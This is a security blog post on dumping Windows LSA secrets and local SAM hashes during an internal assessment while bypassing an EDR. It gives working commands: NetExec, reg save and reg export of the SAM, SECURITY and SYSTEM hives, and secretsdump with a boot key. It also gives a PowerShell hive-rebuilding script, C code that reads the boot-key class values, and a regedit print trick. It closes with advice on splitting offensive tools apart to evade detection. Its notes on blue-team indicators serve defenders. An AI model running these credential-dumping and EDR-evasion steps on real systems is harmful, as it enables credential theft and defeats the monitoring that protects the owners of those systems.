# https://sensepost.com/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/

# Dumping LSA secrets: a story about task decorrelation

[Edr](https://sensepost.com/categories/edr/) [Lsa](https://sensepost.com/categories/lsa/) [Registry](https://sensepost.com/categories/registry/) [Windows](https://sensepost.com/categories/windows/)

Published

03 July 2024

Reading time

~11 minutes

Author

[Aurelien Chalot](https://sensepost.com/authors/aurelien-chalot/)

While doing an internal assessment, I was able to compromise multiple computers and servers but wasn’t able to dump the LSA secrets because of a particular EDR being installed and pretty aggressive against me.

In this blog post we’ll see how this EDR was blocking me and why it is still possible to dump these secrets exploiting decorrelation attacks! As a bonus, I’ll show you a fancy way of retrieving the Windows boot key without having to dump the SYSTEM hive.

## **I/ How does LSA secrets dumping work**

LSA secrets is a specific place in Windows in which secrets are stored. Originally it was used to store cached domain records but was expanded to store all kinds of secrets like, for example, passwords of services running via an Active Directory account (yeah I’m thinking of you MSSQL):

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/ce647dfcb0c9fb03f39367f1d2a5b7f5.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/ce647dfcb0c9fb03f39367f1d2a5b7f5.png)

During internal assessments, when you compromise a server, you will want to access these secrets. To do so, you can use one of the many tools out there, for example [NetExec](https://github.com/Pennyw0rth/NetExec):

```
nxc smb dc.whiteflag.local -u Administrateur -p Defte@WF --lsa
```

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/09ef6ad55f5af148a805c61b37992764.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/09ef6ad55f5af148a805c61b37992764.png)

Usually you also dump the SAM database which contains the NT hash of local accounts:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/16d64d49ff626bcfd5f8fb5133f3ab86.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/16d64d49ff626bcfd5f8fb5133f3ab86.png)

Dumping this information looks simple but under the hood quite a few things happened. First, NetExec had to dump the three following registry hives:

- HKLM\\SAM: contains the NT hashes of the local accounts
- HKLM\\SECURITY: contains the LSA secrets
- HKLM\\SYSTEM: contains information needed to decrypt both the SAM database and the LSA secrets

Taking a look at the code, we can see that NetExec is saving the registry hives to the disk. The interesting code is located in the file [nxc/protocols/smb.py](https://github.com/Pennyw0rth/NetExec/blob/ccbeb4e40259fdbfac58622eb5716e15fce542cf/nxc/protocols/smb.py#L1737):

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/f4e536195d3f6f84611552c1be597a0e.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/f4e536195d3f6f84611552c1be597a0e.png)

`SECURITYFileName=self.remote_ops.saveSECURITY()` calls the secretsdump library from Impacket which is going to save the registry hive into the Temp directory:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/c42ddec37e7183f2a20cd8aca1223c4d.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/c42ddec37e7183f2a20cd8aca1223c4d.png)

Internally, on the Windows host a call to the RegSaveKeyExW WinAPI function will be made:

```
LSTATUS RegSaveKeyExW(
    [in]           HKEY                        hKey,
    [in]           LPCWSTR                     lpFile,
    [in, optional] const LPSECURITY_ATTRIBUTES lpSecurityAttributes,
    [in]           DWORD                       Flags
);
```

This will allow saving the key to a file. Note that it is possible to dump the hives using the reg.exe binary, but ultimately it will also call the RegSaveKeyExW function.

## **II/ From the blueteam perspective**

From a blue team perspective, there are quite a few IOCs that could be flagged and blocked when dumping LSA secrets using NetExec:

1\. Enabling the Remote Registry service:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/0791171fd215102c6ec8691136543b3c.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/0791171fd215102c6ec8691136543b3c.png)

2\. Connecting to the remote registry via RPC.

3\. Saving multiple hives which are sensitive (SAM, SECURITY and SYSTEM). The hives are dumped to files, using an 8 character random string with a terminating .tmp extension in the Temp directory.

4\. The files are downloaded remotely.

Correlating this information, EDRs can block LSA secrets dumping. This EDR was able to block me remotely (which is not surprising), but it also prevented me from dumping the LSA secrets locally using the usual reg save commands:

```
reg save HKLM\SAM SAM
reg save HKLM\Security SECURITY
reg save HKLM\SYSTEM SYSTEM
```

As far as I understood it, the EDR flagged me in two different ways:

1\. It statically flagged the reg save command. When the reg.exe binary was called, the driver probably received a notification and since the argument list contained the keywords “save HKLM\\SAM”, it was denied by the EDR. (If you wanna know how an EDR could do this, I wrote a lengthy blog post on how EDRs work and how you can write your own [here](https://sensepost.com/blog/2024/sensecon-23-from-windows-drivers-to-an-almost-fully-working-edr/)).

2\. It was also able to prevent me from saving the hives even when I hide the command line which means that the access to the HKLM\\{SAM, SECURITY, SYSTEM} hives are protected and/or the RegSaveKey function is hooked.

## **III/ The bypass technique**

Interestingly enough, there is one functionality that is not blocked: reg export.

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/e5fc26b59ed2718637baf35d49263bd4.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/e5fc26b59ed2718637baf35d49263bd4.png)

Which means I was able to retrieve the content of the SAM, SECURITY and SYSTEM hives without triggering the EDR. However, reg export results are not like reg save results. Reg export files are text files which contain the registry keys and their values. For example, if we take a look at the export of the SAM hive, we’ll have the following result:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/cef127d69d435f5a64e8bcfbf4ba5f1f.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/cef127d69d435f5a64e8bcfbf4ba5f1f.png)

We have the values we are looking for, but if you pass these files to secretsdump, it will crash:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/6d90b368c7398fac79a9d4aa5f3a557e.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/6d90b368c7398fac79a9d4aa5f3a557e.png)

The reason is that secretsdump is expecting a specific file format which you will only get via reg save, a file format that contains the keys and a lot of metadata that reg export results doesn’t provide.

At this point, my idea was simple. If I have got the reg export results in a text format, I can just import them in a Windows VM I own then reg save them and run secretsdump. So I wrote a PowerShell script to do that:

```
# reg export file results
$files = @(
    "z:\HIVETEST\DC\sam.reg",
    "z:\HIVETEST\DC\system.reg",
    "z:\HIVETEST\DC\security.reg"
)

# Replacing the HKLM\ to HKCU\HELLO so that I do not overwrite VM's hives
Write-Output "Switching HKLM\ to HKCU\HELLO in .reg files"
foreach ($filePath in $files) {
    $content = Get-Content -Path $filePath -Raw -Encoding Unicode
    $replacement = [char[]] "HKEY_CURRENT_USER\HELLO" -join ''
    $updatedContent = $content -replace "HKEY_LOCAL_MACHINE", $replacement
    Set-Content -Path $filePath -Value $updatedContent -Encoding Unicode
    Write-Output "`tUpdated file: $filePath"
}

# Import .reg files in my VM hives
Write-Output "Importing modified .reg files in HKCU\HELLO"
reg import z:\HIVETEST\DC\sam.reg
reg import z:\HIVETEST\DC\system.reg
reg import z:\HIVETEST\DC\security.reg

# Reg save the hives so that I get correctly formatted hive files
Write-Output "Reg saving back to .hive"
reg save HKEY_CURRENT_USER\HELLO\SAM Z:\HIVETEST\DC\SAM.hive
reg save HKEY_CURRENT_USER\HELLO\SECURITY Z:\HIVETEST\DC\SECURITY.hive
reg save HKEY_CURRENT_USER\HELLO\SYSTEM Z:\HIVETEST\DC\SYSTEM.hive

Write-Output "Removing temporary HKCU\HELLO hives"
reg delete HKEY_CURRENT_USER\HELLO /f
```

Run the script:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/7c9bc2da5b14dbaed5fd3fdf4ee0fe14.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/7c9bc2da5b14dbaed5fd3fdf4ee0fe14.png)

And it works, I was able to import the hives into HKCU\\HELLO\\:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/b5a9e21a0219d9eb5363c9a7be881b96.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/b5a9e21a0219d9eb5363c9a7be881b96.png)

Which means I was able to dump the hives via reg save as well:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/fbfd7e9cc55b1227c0d848bd16154bfc.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/fbfd7e9cc55b1227c0d848bd16154bfc.png)

And now if I run secretsdump:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/e2c27268ecf8dba252e3e41f78fe79fb.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/e2c27268ecf8dba252e3e41f78fe79fb.png)

It fails… Activating the debug option, we will see that it fails retrieving the boot key:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/bd9e228a4c943549240dab6b2c9ddbc0.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/bd9e228a4c943549240dab6b2c9ddbc0.png)

Taking a look at the code of secretsdump we can see that the getBootKey function’s content is the following:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/c7170324634671683f301bec0925e82c.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/c7170324634671683f301bec0925e82c.png)

To compute the boot key, secretsdump queries 4 keys:

```
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\GBG
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Data
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\JD
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Lsa\Skew1
```

It then decodes their values, concatenates them into a 32 bit string and permutes the string which, in the end, gives us the boot key. This boot key will then be used to decrypt things stored in the SAM and SECURITY hives which means that we need to get this key.

Looking at the reg export results we can see that we indeed have the keys:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/9fedec1efce99bb4d6007bf8ddd82354.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/9fedec1efce99bb4d6007bf8ddd82354.png)

And I naively thought that these were the values used to compute the boot key until I found out, after digging in the secretsdump code that it was not. Indeed, if we take a look again at the getBootKey function we will see that it does not do a getValue() call but a getClass() call:

```
ans = winreg.getClass('\\%s\\Control\\Lsa\\%s' % (currentControlSet, key))
```

In fact, secretsdump is not getting a key value, it is getting a class value which is a hidden value you will never see in regedit!

Question is, how do you get it? Well if you have a reg save result you will have the keys, their values and all the metadata around these keys including the class value. If you have a reg export result, you will only have the key and its value. So it’s kind of a game over… Unless you are able to retrieve these class values all by yourself!

And that you can do with a few lines of C code, see below (here is a [gist](https://gist.github.com/Dfte/3462d0a08af57392e1629b8c83021155)):

```
#include <windows.h>
#include <stdio.h>
#define BOOT_KEY_SIZE 16
#pragma warning(disable: 4996)

void getRegistryClassValue(HKEY rootKey, const char* subKey, char* classValue, DWORD classValueSize) {
    HKEY hKey;
    LONG result = RegOpenKeyExA(rootKey, subKey, 0, KEY_READ, &hKey);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr, "Error opening registry key: %ld\n", result);
        return;
    }

    result = RegQueryInfoKeyA(hKey, classValue, &classValueSize, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);
    if (result != ERROR_SUCCESS) {
        fprintf(stderr, "Error querying registry key class: %ld\n", result);
    }
    printf("%s: %s\n", subKey, classValue);
    RegCloseKey(hKey);
}

void hexStringToByteArray(const char* hexString, BYTE* byteArray) {
    size_t len = strlen(hexString);
    for (size_t i = 0; i < len / 2; ++i) {
        sscanf(hexString + 2 * i, "%2hhx", &byteArray[i]);
    }
}

void printByteArray(const BYTE* byteArray, size_t length) {
    for (size_t i = 0; i < length; ++i) {
        printf("%02x", byteArray[i]);
    }
    printf("\n");
}

void permuteBootKey(BYTE* bootKey) {
    BYTE temp[BOOT_KEY_SIZE];
    memcpy(temp, bootKey, BOOT_KEY_SIZE);

    int transforms[] = { 8, 5, 4, 2, 11, 9, 13, 3, 0, 6, 1, 12, 14, 10, 15, 7 };
    for (int i = 0; i < BOOT_KEY_SIZE; ++i) {
        bootKey[i] = temp[transforms[i]];
    }
}

int main() {
    const char* keys[] = { "JD", "Skew1", "GBG", "Data" };
    const char* basePath = "SYSTEM\\CurrentControlSet\\Control\\Lsa\\";
    char fullPath[256];
    char classValue[256];
    BYTE bootKey[BOOT_KEY_SIZE];
    size_t offset = 0;

    for (int i = 0; i < 4; ++i) {
        snprintf(fullPath, sizeof(fullPath), "%s%s", basePath, keys[i]);
        getRegistryClassValue(HKEY_LOCAL_MACHINE, fullPath, classValue, sizeof(classValue));
        hexStringToByteArray(classValue, bootKey + offset);
        offset += strlen(classValue) / 2;
    }
    permuteBootKey(bootKey);
    printf("Boot key is: ");
    printByteArray(bootKey, BOOT_KEY_SIZE);
    return 0;
}
```

Compile the code, run it and here is the boot key:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/cfa208e47ebcd183a90ced6bb21c3c86.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/cfa208e47ebcd183a90ced6bb21c3c86.png)

Two things are important with this binary. First you don’t need NT SYSTEM privileges to get the values (which is a pretty huge prerequisite). Second, you may think that reading these values is flagged/blocked by AV/EDRs… But it’s not:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/b28797f85de44e7c6c41b7f6091b4059.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/c9a2f9cdd41c6f6aa5aff835e54b6dda.png)

Now let’s say that the binary is blocked. Is there another way of retrieving the values to compute the key? At first I thought no. But a couple of days ago, my friend Julien [@d3lb3\_](https://x.com/d3lb3_) who is the creator of the huge [KeePwn](https://github.com/Orange-Cyberdefense/KeePwn) tool, told me this:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/329829cae9abdbb89086275f61dc278a.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/329829cae9abdbb89086275f61dc278a.png)

Which translated says:

> _Concerning the export of registry keys, I saw that it is possible to directly print the key values from regedit. Imagine a tool which can find SAM databases in PDF files lol._

As you can see, I took it as a joke… But then I wondered, what if I try to print the \\LSA hive? So I opened the editor, clicked on the hive, pressed Ctrl+P, saved the file as a PDF and opened it a PDF reader. Needless to say that I was not disappointed:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/1b295e4d363b04b83a464a0fde08bd0c.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/1b295e4d363b04b83a464a0fde08bd0c.png)

Here are the class values used to compute the boot key. So now we don’t even have to launch a binary to get these values!

At this point we have:

- The computed boot key (whether it is via the print technique or using the binary)
- The reg export results that we imported into our Windows VM and dumped as reg save results

Which means we have all we need to decrypt LSA secrets and SAM.

* * *

If you want to get more information about the decryption process itself, I suggest you read this [amazing blog post](https://moyix.blogspot.com/2008/02/syskey-and-sam.html) writen by [@moyix](https://x.com/moyix).

* * *

Running secretsdump giving it the SAM hive, the SECURITY one and the boot key:

```
secretsdump.py -sam SAM.hive -security SECURITY.hive -bootkey 8c3bac750e7486be47d92a9c49edc98a
```

Allows it to decrypt all the information:

[![](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/22d5e9c2bd7056dd2b34c81a41c4e163.png)](https://sensepost.com/img/pages/blog/2024/dumping-lsa-secrets-a-story-about-task-decorrelation/22d5e9c2bd7056dd2b34c81a41c4e163.png)

Secrets unveiled!

## IV/ **Why this technique is not blocked or detected by AV/EDR**

The technique I presented here is not blocked or detected as malicious by any EDR/AV (except the 3 mentioned in VirusTotal which, to me, probably is a false positive) for a simple reason: attack decorrelation.

Most of the time, attackers upload binaries that perform many actions. For example, if you ever run Mimikatz to dump the LSASS process, Mimikatz will:

- Activate the SeDebugPrivilege
- Look for the LSASS PID
- Open a handle to the LSASS process
- Read the content of its memory
- Save it to a dump file or print it on the cmd

All of these actions use WinAPI functions which are the things AVs and EDRs are monitoring.

The fact that a simple binary is running all of these actions in quick succession is a good indicator that something’s wrong with the binary. In our case, NetExec was blocked by the EDR because it correlated the actions previously mentioned and thus, detected that a malicious action was occurring.

One way of preventing such security tools blocking you is decorrelating your actions. That means that instead of having a single tool doing all the actions, you should have multiple tools that do a simple task.

In our case, we can break the “LSA secrets dumping attack” into 3 steps:

- Get the boot key (whether running the previously mentioned binary whose only purpose is to query some registry key class values or via the print method)
- Reg export the SAM and SECURITY hives which you can you do using reg.exe. Note, that export won’t be blocked because once again, it is only reading registry keys and programs read registry keys all the time. If EDRs had to monitor all of these read operations, I guess the system would crash.
- Exfiltrate the reg export results as well as the boot key. Since we have all the material we need, we can decrypt the secrets on a computer we own. This will allow us to not run cryptographic operations on the target system, thus limiting detection.

If you do that, you will get all the information needed to decrypt the secrets, but since you have done minimalistic operations on the system, EDRs won’t see you. I used this “decorrelation” technique a lot in the last couple of years and it allowed me to completely bypass EDRs in order to dump LSA secrets but also DPAPI secrets (especially Google Chrome cookies which are encrypted via the DPAPI) without having to go through complicated malware dev and it is really, I mean reaallllllyyy, powerful.

Final words, if your offensive binary gets blocked by an EDR, try to break it into multiple smaller tools and/or manual operations. Remove as much code as you can, remove useless strings such as “how to use” helpers. Only keep the necessary code, the one that is doing the desired action. The less action a binary does, the less likely it is to be flagged ;)!

Happy hacking!